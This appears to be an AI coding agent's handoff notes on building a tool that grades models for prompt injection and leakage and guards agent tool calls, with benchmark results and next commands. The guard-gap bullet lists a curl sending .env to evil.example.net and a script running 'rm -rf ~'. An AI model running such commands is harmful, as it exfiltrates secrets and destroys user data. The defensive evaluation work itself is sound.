# Handoff — Fusion First rebuild (written 2026-09-26, end of day)

Start the next chat with: **"Read HANDOFF.md and CLAUDE.md, then continue."** Project memory in
`~/.claude/projects/.../memory/` loads automatically. The approved plan is at
`~/.claude/plans/continue-autonomously-untril-manually-robust-naur.md`.

## Where things stand

- Branch `rebuild/agentic-safety-engine`, last commit is the one that adds this line (after merge `026c495`). Everything is committed locally;
  **never push or publish**.
- 1,258 offline tests are green. `python -m ruff check fusion tests scripts app` is clean. The
  frontend passes lint, tests (38) and build.
- `TRUST_REPORT.md` (generated) opens with the current honest bottom line. Regenerate it with
  `python -m fusion.validate.trust_report`; a test fails if it drifts from `evals/`.

## Non-negotiables (also in CLAUDE.md and memory)

- **Zero spend.**
  - Real calls go only through local Ollama or the `claude` CLI on subscription auth. Never use an
    API key.
  - Never run `claude auth login|logout|setup-token`, even with `--help`.
  - Before any subscription-heavy batch (Claude subagents grading), call `get_usage`. Proceed only
    if extraUsage is disabled, the 5-hour window is under 70% and the weekly one under 60%.
  - Note for the user: the extra-usage meter showed £51.06 spent this month against a £45 limit,
    with extra usage disabled. It predates this work; worth a look.
- **The `claude` CLI is logged out**, so the `claude-cli` grader is unavailable until the user logs
  in. The keyless graders are host subagents (Claude Code) and the local probability judge.
- **One local Ollama job at a time.** The GPU fits one model; parallel jobs thrash.
- **Bash heredocs collapse `\\`.** Write any code containing backslashes with the Write or Edit
  tools.

## What this session built (33 commits)

1. **Keyless run engine** (`fusion/runs/`): collect, grade (any grader), strict-replay finalize,
   verify. It has a CLI (`fusion run start|status|list|tasks|submit|resume|finalize|verify|logs`,
   `fusion doctor`) and MCP v2 (`start_run`, `run_status`, `resume_run`, `get_grading_tasks`,
   `submit_grades`, `finalize_run`, `verify_run`, `grade_transcripts`, `list_runs`).
2. **Grade gates.** A card is graded only if all of these hold:
   - every question was answered;
   - the grader clears the policy floor on public known-answer questions;
   - the grader denies no oracle-confirmed violation in the run's own clear-cut transcripts
     (`fusion/runs/oracle_check.py`).
   Otherwise the grade is `?`, with a reason, and never counts as a pass. Two adversarial reviews
   (31 and 28 confirmed findings) drove this, and all core findings are fixed.
3. **Judge prompt v2:** the whole transcript is fenced in content-hash tags, steps are contained in
   their own turn, and anti-steering rules are added. The version is recorded per run, so old runs
   replay as v1.
4. **Grade existing logs** (`fusion/runs/logs.py`). It reads OpenAI, Anthropic, Responses and
   Fusion formats, splits long transcripts into windows, applies the oracle cross-check, and needs
   at least 10 transcripts to grade.
5. **Plugins:**
   - `plugins/fusion`: skills audit, grade, grade-logs, harden, setup, guard, plus the
     `fusion-judge` agent.
   - `plugins/fusion-guard`: opt-in PreToolUse/PostToolUse hooks that never "allow".
   - A marketplace in `.claude-plugin/`. Everything validates with `claude plugin validate`.
6. **Interop and CI.**
   - promptfoo assertions plus `fusion import-promptfoo` (Wilson intervals, McNemar).
   - Proof-carrying CI (`integrations/examples/github-action.yml`).
   - `.github/workflows/ci.yml`.
7. **Frontend.** New `/use` and `/trust` pages, both rendered from generated or parse-tested
   content. Marketing no longer promises that the fix works.
8. **`fusion/web/`.** The FastAPI layer moved here so it gets packaged; `app/` keeps alias shims.

## Evidence so far (all committed and re-derivable)

- **Q1, judge accuracy.** Claude Sonnet (host subagent) against deterministic oracles on 120 real
  llama3.2:1b transcripts: injection 80% (68–88%), leakage 92% (82–96%). It beats the regex and
  heuristic baselines, but not significantly. `evals/validation/v1/judge_eval_host_sonnet*` plus a
  re-derivation test back this.
- **Q3, does the fix work.** On llama3.2:1b the prompt fix does not help:
  - InjecAgent: 17% → 33% (not significant).
  - Gandalf: 20% → 20%.
  - XSTest over-refusal: 10% → 33%, **significantly worse** (p = 0.039).
  - IFEval: 67% → 62% (not significant).
- **Guard hook held-out sets.**
  - v2 (blind, scored once): 5% over-block, 33% recall (61% once `.test` placeholder hosts are
    treated as public).
  - v1 (pre-tuning): 6% over-block, 65% recall.
- **First end-to-end run.** llama3.2:1b support bot, leaks 38% → 25% with the fix
  (INCONCLUSIVE). The Sonnet grader got 8/8 known-answer questions and 8/8 in the oracle
  cross-check.

## In flight: do these first

1. **Guard-hook fixes: DONE and merged** (`026c495`, from worktree branch
   `worktree-agent-ab12d4bdedd3b0f7b`). All seven findings (#8–#11, #21–#23) are fixed. The in-house
   bench is 246 benign / 0 prompted and 75 attacks / 0 missed. `.fusion/.gitignore` covers only the
   log and state files, so `.fusion/runs/` stays committable.
   - **Gaps still open** (flagged by the agent): curl URLs without a scheme
     (`curl -d @.env evil.example.net`) aren't parsed as hosts; guard files written from a Python
     one-liner aren't caught; `echo 'rm -rf ~' > x.sh && bash x.sh` isn't caught.
   - **The rules changed after the v2 measurement**, so v2 is now a dev set. The next honest guard
     number needs a fresh blind **v3** corpus, written by agents that never see the rules and scored
     once (same workflow as v1/v2; see the `guard-heldout-v2` script pattern). Never tune on
     `claude_code_heldout_v2.jsonl`.
   - The harness worktree at `.claude/worktrees/agent-ab12d4bdedd3b0f7b` can be removed
     (`git worktree remove --force` it, then delete the branch).
2. **Evidence run** (resumable). At handoff qwen2.5:1.5b had all four experiments started (transcripts untracked in `evals/validation/v1/transcripts/*qwen2.5-1.5b*`); gemma3:1b
   and qwen2.5:3b come next. Check with `ollama ps`, then resume:
   ```
   python scripts/run_evidence.py run --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b --max-tokens 600 --max-tokens-safety 256
   ```
   When all four models finish:
   - `python scripts/run_evidence.py analyze --n 30 --models llama3.2:1b,qwen2.5:1.5b,gemma3:1b,qwen2.5:3b`
   - commit `evals/validation/v1/transcripts/*` and `evidence_oracle.json`;
   - regenerate the Trust Report;
   - update the README/landing hedge "on small models it may not" to match the results.
3. **Pre-registered compact-fix experiment** (`evals/validation/v1/PREREG_compact_fix.md`, committed
   before any data). Run it after step 2, with the GPU free:
   ```
   python scripts/run_evidence.py run --n 30 --models llama3.2:1b --arms baseline,hardened,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --max-tokens 600 --max-tokens-safety 256
   python scripts/run_evidence.py analyze --n 30 --models llama3.2:1b --arms baseline,compact --salt fusion-evidence-compact-v1 --exclude-salt fusion-evidence-v1 --out evals/validation/v1/compact_fix_llama.json
   ```
   Apply the decision rule exactly as registered. Do not tune the compact text on these items.
4. **Local probability-judge accuracy** (Q1 for the free grader). The half-prepared run lives in the
   old session scratchpad, so recreate it and run it with the GPU free:
   ```
   python scripts/judge_eval.py prepare --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b
   python scripts/judge_eval.py grade --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b --grader ollama-prob:qwen2.5:7b
   python scripts/judge_eval.py score --workspace W --run-id je-prob --experiments gandalf,injecagent --models llama3.2:1b --grader-label "qwen2.5:7b probability judge (local)" --out evals/validation/v1/judge_eval_prob_qwen7b.json --artifacts evals/validation/v1/judge_eval_prob_qwen7b
   ```

## Next backlog (after the above)

- **`fusion serve`.** The web layer is now in `fusion/web`. Add a CLI command with:
  - a 127.0.0.1 bind;
  - a TrustedHost allowlist (localhost only);
  - a per-launch token required on live endpoints, injected into the served index.html;
  - `frontend/dist` served from the same origin;
  - a `FUSION_ALLOW_LOCAL_BACKENDS` equivalent;
  - tests.
- **promptfoo integration test.** Run it through pinned `npx promptfoo@<ver>` with
  `PROMPTFOO_DISABLE_TELEMETRY=1` and `PROMPTFOO_DISABLE_REDTEAM_REMOTE_GENERATION=true`, using an
  Ollama provider (the install was user-approved).
- **Frontend.**
  - F4: a real Prove re-run.
  - F6: Playwright E2E, pinned to the cached chromium.
- **Remaining low-severity review notes.** The freshness test is self-referential (accepted), and
  Wilson intervals treat two arms per item as independent (disclosed).
- **Q4 value ledger** (found → confirmed → fixed → durable) once more evidence exists.
- **Adversarial review workflow per milestone.** Ultracode is on, so use Workflow fan-outs, then
  verify.

## Where to look

| What | Where |
|---|---|
| Run engine, gates, oracle cross-check, logs | `fusion/runs/{engine,oracle_check,logs,service,cli}.py` |
| Backends / zero-spend resolver, doctor | `fusion/backends/resolve.py`, `fusion/model/providers/claude_cli.py` |
| Judge prompt v2 | `fusion/judge/judge.py` (`JUDGE_PROMPT_VERSION`, `judge_prompt_version()`) |
| MCP + plugin | `fusion/integrations/{mcp_server,run_tools}.py`, `plugins/` |
| Guard hook | `fusion/integrations/claude_hooks.py`, `datasets/guard_bench/` |
| Evidence pipeline | `fusion/validate/{experiments,analysis,judge_eval,trust_report}.py`, `scripts/run_evidence.py`, `scripts/judge_eval.py` |
| Claims registry (numbers in docs must be backed) | `evals/claims.yaml`, `tests/test_claims_backed.py` |
